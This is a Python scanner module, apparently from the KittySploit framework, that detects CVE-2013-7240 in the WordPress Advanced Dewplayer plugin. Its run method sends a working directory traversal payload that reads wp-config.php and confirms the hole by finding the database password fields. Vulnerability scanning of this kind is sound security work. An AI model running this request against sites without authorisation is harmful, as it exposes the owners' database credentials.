#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in download-file."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Plugin Advanced Dewplayer 1.2 - Directory Traversal Detection',
        'description': 'A directory traversal vulnerability in download-file.php in the Advanced Dewplayer plugin 1.2 for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the dew_file parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2013', 'wp-plugin', 'lfi', 'edb', 'seclists', 'wordpress', 'westerndeal', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/38936',
            'https://nvd.nist.gov/vuln/detail/CVE-2013-7240',
            'https://wordpress.org/support/topic/security-vulnerability-cve-2013-7240-directory-traversal/',
            'http://seclists.org/oss-sec/2013/q4/570',
            'http://seclists.org/oss-sec/2013/q4/566',
        ],
        'cve': 'CVE-2013-7240',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD', 'DB_HOST', 'The base configurations of the WordPress',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="WordPress Plugin Advanced Dewplayer 1.2 - Directory Traversal detected",
                path='/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php',
            )
            return True
        return False

